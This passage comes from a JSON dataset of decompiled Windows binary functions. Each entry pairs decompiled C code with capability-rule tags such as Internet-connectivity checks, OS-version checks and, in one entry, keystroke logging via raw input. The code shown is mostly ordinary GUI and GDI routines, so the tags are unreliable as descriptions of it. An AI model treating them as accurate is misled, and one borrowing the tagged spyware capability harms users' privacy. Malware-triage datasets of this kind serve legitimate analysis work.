        "decompiled_code": "\nvoid fcn.004280c0(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if (*(in_EAX + 0x28) == 0) {\n        fcn.00427b34();\n    }\n    else if (1 < *(*(in_EAX + 0x28) + 4)) {\n        iVar2 = fcn.00404620();\n        iVar1 = *(*(in_EAX + 0x28) + 8);\n        if (iVar1 != 0) {\n            uVar3 = sub.gdi32.dll_CopyEnhMetaFileA(iVar1, 0);\n            *(iVar2 + 8) = uVar3;\n        }\n        *(iVar2 + 0x10) = *(*(in_EAX + 0x28) + 0x10);\n        *(iVar2 + 0xc) = *(*(in_EAX + 0x28) + 0xc);\n        *(iVar2 + 0x18) = *(*(in_EAX + 0x28) + 0x18);\n        *(iVar2 + 0x1c) = *(*(in_EAX + 0x28) + 0x1c);\n        *(iVar2 + 0x20) = *(*(in_EAX + 0x28) + 0x20);\n        fcn.004288b8();\n        *(in_EAX + 0x28) = iVar2;\n        fcn.004288b4();\n    }\n    return;\n}\n",
        "token_count": 347
    },
    "004299ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004299ec(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if ((*(iVar1 + 0x28) == 1) && (*(iVar1 + 0x2a) == 1)) {\n        return CONCAT31(iVar1 + 0x18 >> 8, 1);\n    }\n    return 0;\n}\n",
        "token_count": 100
    },
    "0042a544": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a544(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack128;\n    uint uStack124;\n    uchar *puStack120;\n    int32_t iStack116;\n    uint uStack112;\n    uint *puStack108;\n    uint lpvObject;\n    int32_t var_4h;\n    \n    iVar1 = in_EAX[10];\n    if (param_2 != *(iVar1 + 8)) {\n        puStack108 = 0x42a564;\n        fcn.00429bcc();\n        puStack108 = 0x42a573;\n        fcn.00403af4();\n        if (param_2 != 0) {\n            puStack108 = &fcn.0042a544::lpvObject;\n            uStack112 = 0x54;\n            puStack120 = 0x42a583;\n            iStack116 = param_2;\n            sub.gdi32.dll_GetObjectA();\n        }\n        if (*(iVar1 + 4) == 1) {\n            var_4h = *(iVar1 + 0x10);\n            *(iVar1 + 0x10) = 0;\n        }\n        else if (*(iVar1 + 0x10) == *0x4979fc) {\n            var_4h = *0x4979fc;\n        }\n        else {\n            puStack120 = 0x42a5b0;\n            var_4h = fcn.004290ec();\n        }\n        uStack124 = 0x42a5df;\n        uStack128 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff80;\n        uVar2 = 0;\n        puStack120 = &stack0xfffffffc;\n        fcn.00429e3c(0, 0, &fcn.0042a544::lpvObject);\n        *in_FS_OFFSET = uVar2;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 469
    },
    "0042a760": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a760(uint param_1, uint8_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint auStack96 [4];\n    uint16_t uStack80;\n    uint16_t uStack78;\n    uint uStack72;\n    uint16_t uStack60;\n    uint16_t uStack58;\n    \n    iVar1 = in_EAX[10];\n    if ((*(iVar1 + 0x3c) == 1) && (*(iVar1 + 0x3e) == 1)) {\n        uVar2 = 1;\n    }\n    else {\n        uVar2 = 0;\n    }\n    if (param_2 != uVar2) {\n        fcn.00429bdc();\n        puVar4 = iVar1 + 0x18;\n        puVar5 = auStack96;\n        for (iVar3 = 0x15; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        uStack72 = 0;\n        uStack60 = param_2;\n        uStack80 = param_2;\n        uStack78 = uStack80;\n        uStack58 = uStack60;\n        fcn.004294fc(auStack96);\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 364
    },
    "0042a7dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a7dc(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint uStack124;\n    uint uStack120;\n    uchar *puStack116;\n    uint var_58h;\n    uint var_4h;\n    \n    iVar1 = in_EAX[10];\n    if (param_2 != *(iVar1 + 0x10)) {\n        if ((param_2 == 0) && (*(iVar1 + 4) == 1)) {\n            fcn.00423840();\n            *(iVar1 + 0x10) = 0;\n        }\n        else {\n            fcn.00429bcc();\n            fcn.00429bdc();\n            puVar3 = iVar1 + 0x18;\n            puVar4 = &fcn.0042a7dc::var_58h;\n            for (iVar2 = 0x15; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            puStack116 = 0x42a842;\n            var_4h = fcn.00428a88(0, &fcn.0042a7dc::var_58h);\n            uStack120 = 0x42a874;\n            uStack124 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff84;\n            uVar5 = 0;\n            puStack116 = &stack0xfffffffc;\n            fcn.00429e3c(0, *(iVar1 + 0x70), &fcn.0042a7dc::var_58h);\n            *in_FS_OFFSET = uVar5;\n        }\n        fcn.00428980();\n        *(in_EAX + 0x22) = 1;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 483
    },
    "0042b3fc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid fcn.0042b3fc(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack304;\n    uint uStack300;\n    uchar *puStack296;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint uStack276;\n    uchar *puStack272;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack272 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack276 = 0x42b4ff;\n    uStack280 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffee8;\n    uStack284 = 0x48;\n    uStack288 = *0x497a04;\n    uStack292 = 8;\n    puStack296 = 0x42b427;\n    *0x48fb8c = sub.kernel32.dll_MulDiv();\n    *0x48fb8c = -*0x48fb8c;\n    if (**0x4927cc == 1) {\n        puStack296 = 0x42b43d;\n        cVar1 = fcn.0042b3b8();\n        if (cVar1 == -0x80) {\n            puStack296 = 0x42b44e;\n            fcn.004055c8();\n        }\n    }\n    puStack296 = 0x42b45a;\n    var_8h = fcn.00421644();\n    uStack300 = 0x42b4b7;\n    uStack304 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed0;\n    puStack296 = &stack0xfffffffc;\n    fcn.00421720();\n    cVar1 = fcn.00421988();\n    if (cVar1 != '\\0') {\n        fcn.00421fe8();\n        fcn.004216f0();\n    }\n    *in_FS_OFFSET = uStack304;\n    puStack296 = 0x42b4be;\n    uStack300 = 0x42b4b6;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 483
    },
    "0042ed3c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0042ed3c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    fcn.0042ec3c();\n    uVar1 = fcn.004059dc();\n    uVar1 = sub.kernel32.dll_CreateEventA(in_ECX, -(arg_14h != '\\0'), -(arg_10h != '\\0'), uVar1);\n    *(in_EAX + 4) = uVar1;\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = in_ECX;\n    }\n    return in_EAX;\n}\n",
        "token_count": 236
    },
    "0043b6cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0043b6cc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX == *(*0x497c1c + 0x30)) {\n        return -(*0x497c2c != '\\0');\n    }\n    iVar1 = sub.user32.dll_IsIconic();\n    return iVar1;\n}\n",
        "token_count": 86
    },
    "0043c06c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043c06c(uint arg_8h)\n\n{\n    int16_t in_AX;\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0x100000;\n    if (in_AX == 1) {\n        uVar3 = 0x200000;\n    }\n    uVar1 = fcn.00458568(0xfffffff0);\n    uVar2 = sub.user32.dll_GetWindowLongA(uVar1);\n    return uVar2 & 0xffffff00 | (uVar2 & uVar3) != 0;\n}\n",
        "token_count": 144
    },
    "0043c11c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0043c11c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_6h;\n    \n    uVar1 = fcn.00458568(0xfffffff0);\n    sub.user32.dll_GetWindowLongA(uVar1);\n    if (*(in_EAX + 0x18) == '\\x01') {\n        iVar2 = fcn.0043c0a0(&stack0xfffffffc);\n        iVar3 = fcn.004501c4();\n        iVar2 = iVar2 + iVar3;\n    }\n    else {\n        iVar2 = fcn.0043c0a0(&stack0xfffffffc);\n        iVar3 = fcn.00450180();\n        iVar2 = iVar2 + iVar3;\n    }\n    return iVar2;\n}\n",
        "token_count": 198
    },
    "0043c1b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043c1b4(int32_t arg_8h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_4h;\n    \n    var_1ch = 0x1c;\n    var_18h = 0x10;\n    iVar1 = *(*(arg_8h + -8) + 6);\n    uVar2 = fcn.00458568(*(*(arg_8h + -4) + 0x18) == '\\x01', &var_1ch);\n    iVar3 = (***0x4924b8)(uVar2);\n    iVar4 = iVar1;\n    if (iVar3 != 0) {\n        iVar4 = var_4h;\n    }\n    return iVar4;\n}\n",
        "token_count": 205
    },
    "00441c74": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00441c74(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_ECX;\n    uchar *in_EDX;\n    \n    if (*(in_EAX + 0x158) == '\\x01') {\n        *in_EDX = 1;\n        *in_ECX = *(in_EAX + 0x160);\n    }\n    else {\n        *in_EDX = 0;\n        fcn.00405584();\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "00444b8c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00444b8c(void)\n\n{\n    char in_AL;\n    uint uStack8;\n    int32_t iStack4;\n    \n    uStack8 = 8;\n    iStack4 = -(in_AL != '\\0');\n    sub.user32.dll_SystemParametersInfoA(0x49, 8, &uStack8, 0);\n    return;\n}\n",
        "token_count": 82
    },
    "004470d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004470d8(int32_t arg_8h)\n\n{\n    uint8_t in_AL;\n    int32_t iVar1;\n    \n    iVar1 = sub.user32.dll_IsWindowVisible(*(*(arg_8h + -4) + 0x30));\n    if ((1U - (iVar1 == 0) == *0x490624) && (in_AL != *0x490624)) {\n        sub.user32.dll_SetWindowPos(*(*(arg_8h + -4) + 0x30), 0, 0, 0, 0, 0, *(in_AL * 2 + 0x490628));\n        *0x490624 = in_AL;\n    }\n    return;\n}\n",
        "token_count": 162
    },
    "004484ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004484ec(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x448599;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0x4c) = uVar1;\n    if (((*(in_EAX + 0x30) < 1) || (0x8000 < *(in_EAX + 0x30))) || (*(in_EAX + 0x34) < 1)) {\n        fcn.00407550();\n        fcn.0040daec();\n        fcn.00404ec4();\n    }\n    *(in_EAX + 0x38) = 4;\n    *(in_EAX + 0x41) = 1;\n    fcn.00449004();\n    *(in_EAX + 0x43) = 0;\n    *(in_EAX + 0x44) = 0x1fffffff;\n    *(in_EAX + 0x48) = 0x1fffffff;\n    uVar1 = fcn.0042935c();\n    *(in_EAX + 0x50) = uVar1;\n    fcn.004485b8();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x4485a0;\n    uStack20 = 0x448598;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 384
    },
    "004486f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004486f0(int32_t *param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    fcn.00448f8c();\n    if (param_2 == NULL) {\n        (**(**(in_EAX + 0x50) + 0x68))();\n    }\n    else {\n        cVar1 = fcn.0042999c();\n        if (cVar1 == '\\x01') {\n            (**(*param_2 + 0x68))();\n        }\n        else {\n            (**(*param_1 + 8))();\n            (**(*param_1 + 0x70))();\n            (**(*param_1 + 0x68))();\n        }\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "0044a824": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a824(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    if (param_2 != *(in_EAX + 0x6a)) {\n        if (in_EAX[0x17] != 0) {\n            cVar1 = *(in_EAX[0x17] + 0x58);\n            if (cVar1 == '\\x01') {\n                *(in_EAX + 0x6a) = param_2;\n                return;\n            }\n            if (cVar1 == '\\x02') {\n                param_2 = '\\x01';\n            }\n        }\n        iVar3 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar3 + -1) {\n            do {\n                piVar2 = fcn.00404800();\n                if (piVar2 != NULL) {\n                    (**(*piVar2 + 0x54))();\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        *(in_EAX + 0x6a) = param_2;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 295
    },
    "0044df78": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0044df78(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        uVar2 = fcn.00458568();\n        uVar2 = fcn.00458568(uVar2);\n        iVar3 = sub.user32.dll_IsChild(uVar2);\n        return iVar3 != 0;\n    }\n    return false;\n}\n",
        "token_count": 117
    },
    "0044e2a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0044e2a0(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    \n    bVar2 = false;\n    if (*(*0x497c84 + 8) != 0) {\n        iVar1 = fcn.0044e16c(*0x497c84 + 0x10, *(*0x497c84 + 8));\n        bVar2 = iVar1 != 0;\n    }\n    return bVar2;\n}\n",
        "token_count": 107
    },
    "0044fb30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044fb30(char param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    fcn.00420274();\n    if (param_1 == '\\x01') {\n        if (param_2 == in_EAX[0x20]) {\n            fcn.004507b8();\n        }\n        else {\n            iVar1 = (**(*in_EAX + 0x3c))();\n            if (param_2 == iVar1) {\n                fcn.0044f99c();\n            }\n            else if (param_2 == in_EAX[0x25]) {\n                in_EAX[0x25] = 0;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 171
    },
    "004546b8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004546b8(char param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    fcn.0044fb30();\n    if ((param_2 == *(in_EAX + 0x23c)) && (param_1 == '\\x01')) {\n        *(in_EAX + 0x23c) = 0;\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "00454710": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454710(uint param_1, uint32_t *param_2)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.00450ed8();\n    if (cVar1 != '\\0') {\n        *param_2 = *param_2 | 0x2000;\n    }\n    cVar1 = fcn.00450f08();\n    if (cVar1 != '\\0') {\n        *param_2 = *param_2 | 0x4000;\n    }\n    cVar1 = fcn.0040484c();\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.0040484c();\n        if (cVar1 == '\\0') {\n            *param_2 = *param_2 | 0x1000;\n        }\n        else {\n            cVar1 = fcn.0040484c();\n            if (cVar1 == '\\x01') {\n                *param_2 = *param_2;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 233
    },
    "0045a164": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0045a164(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t in_EDX;\n    bool bVar3;\n    uint x;\n    uint y;\n    uint var_4h;\n    \n    bVar3 = false;\n    cVar1 = fcn.004485a4();\n    if ((cVar1 != '\\0') && (in_EDX != *(in_EAX + 0x6c))) {\n        fcn.0045a1c8();\n        *(in_EAX + 0x6c) = in_EDX;\n        fcn.0045a044(&x);\n        iVar2 = sub.comctl32.dll_ImageList_DragEnter(*(in_EAX + 0x6c), x, y);\n        bVar3 = iVar2 != 0;\n    }\n    return bVar3;\n}\n",
        "token_count": 205
    },
    "0045a1ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0045a1ec(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uStack28;\n    uint *puVar4;\n    uint auStack20 [2];\n    \n    puVar4 = auStack20;\n    cVar1 = fcn.004485a4();\n    if (cVar1 == '\\0') {\n        uVar3 = 0;\n    }\n    else {\n        fcn.0045a044(auStack20);\n        uStack28 = auStack20[0];\n        iVar2 = sub.comctl32.dll_ImageList_DragMove(puVar4);\n        uVar3 = iVar2 != 0;\n    }\n    return CONCAT44(uStack28, uVar3);\n}\n",
        "token_count": 171
    },
    "0045a4e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045a4e0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != *(*(in_EAX + 0x1c) + 100)) {\n        in_EAX = *(in_EAX + 0x14);\n    }\n    if (*(in_EAX + 0x10) != '\\x01') {\n        if (*(in_EAX + 0x10) == '\\x02') {\n            fcn.0045a570();\n        }\n        else {\n            fcn.0040daec();\n            fcn.00404ec4();\n        }\n        return;\n    }\n    fcn.0045a570();\n    return;\n}\n",
        "token_count": 152
    },
    "0045a528": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045a528(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != *(*(in_EAX + 0x1c) + 100)) {\n        in_EAX = *(in_EAX + 0x14);\n    }\n    if (*(in_EAX + 0x10) != '\\x01') {\n        if (*(in_EAX + 0x10) == '\\x02') {\n            fcn.0045a5f4();\n        }\n        else {\n            fcn.0040daec();\n            fcn.00404ec4();\n        }\n        return;\n    }\n    fcn.0045a5f4();\n    return;\n}\n",
        "token_count": 154
    },
    "0045aad8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045aad8(int32_t param_1, char param_2)\n\n{\n    uchar uVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_ch;\n    uint var_5h;\n    \n    if (param_2 != '\\0') {\n        puStack48 = 0x45aaed;\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n    }\n    puStack48 = 0x45ab00;\n    fcn.00404620();\n    in_EAX[3] = 4;\n    in_EAX[5] = param_1;\n    in_EAX[0x1c] = 0x80000;\n    in_EAX[6] = 0xc;\n    if ((*(param_1 + 0x5b) == '\\x01') || (*(param_1 + 0x5b) == '\\x02')) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 1;\n    }\n    *(in_EAX + 7) = uVar1;\n    puStack48 = 0x45ab51;\n    iVar2 = fcn.0045a44c();\n    in_EAX[0x19] = iVar2;\n    puStack48 = 0x45ab63;\n    iVar2 = fcn.00424d90();\n    in_EAX[4] = iVar2;\n    puStack48 = 0x45ab77;\n    fcn.0042b888();\n    puStack48 = 0x45ab80;\n    fcn.00424f0c();\n    puStack48 = 0x45ab88;\n    fcn.0045acac();\n    uStack52 = 0x45abe5;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    iVar2 = fcn.00454658();\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.0045461c(0);\n            (**(*in_EAX + 0xc))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.0045a6ac();\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x45abec;\n    uStack52 = 0x45abe4;\n    fcn.0045acb0();\n    return;\n}\n",
        "token_count": 598
    },
    "0045c7dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045c7dc(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.0045d5ac();\n    fcn.0045c8a4();\n    sub.user32.dll_ReleaseDC(*(in_EAX + 0x5c), *(in_EAX + 0x58));\n    if (*(*(*(in_EAX + 0x60) + 0x14) + 0x10) == '\\x01') {\n        fcn.0045a9f0();\n    }\n    else {\n        fcn.0045a9f0();\n    }\n    fcn.0045c700();\n    fcn.0045ad84(0x45c880);\n    *(in_EAX + 0x60) = 0;\n    return;\n}\n",
        "token_count": 175
    },
    "0045c8a4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045c8a4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    \n    if (*(in_EAX + 0x60) != 0) {\n        if (*(*(*(in_EAX + 0x60) + 0x14) + 0x10) == '\\x01') {\n            iVar1 = fcn.0045a570();\n            iVar2 = *(in_EAX + 0xc) >> 1;\n            if (iVar2 < 0) {\n                iVar2 = iVar2 + ((*(in_EAX + 0xc) & 1) != 0);\n            }\n            iVar2 = *(in_EAX + 0x54) - iVar2;\n            iVar3 = fcn.0045a5f4(iVar1, iVar2);\n            iVar3 = iVar3 + iVar1;\n            iVar4 = iVar2 + *(in_EAX + 0xc);\n        }\n        else {\n            iVar1 = *(in_EAX + 0xc) >> 1;\n            if (iVar1 < 0) {\n                iVar1 = iVar1 + ((*(in_EAX + 0xc) & 1) != 0);\n            }\n            iVar1 = *(in_EAX + 0x50) - iVar1;\n            iVar2 = fcn.0045a570(iVar1);\n            iVar3 = iVar1 + *(in_EAX + 0xc);\n            iVar4 = fcn.0045a5f4(iVar1, iVar2, iVar3);\n            iVar4 = iVar4 + iVar2;\n        }\n        iVar4 = fcn.00424f6c(iVar1, iVar2, iVar3, iVar4);\n        iVar3 = *(in_EAX + 0x58);\n        uVar5 = sub.gdi32.dll_SelectObject(iVar3, iVar4);\n        sub.gdi32.dll_PatBlt(*(in_EAX + 0x58), iVar3, iVar4, iVar1 - iVar3, iVar2 - iVar4, 0x5a0049);\n        sub.gdi32.dll_SelectObject(*(in_EAX + 0x58), uVar5);\n    }\n    return;\n}\n",
        "token_count": 511
    },
    "0045d1bc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
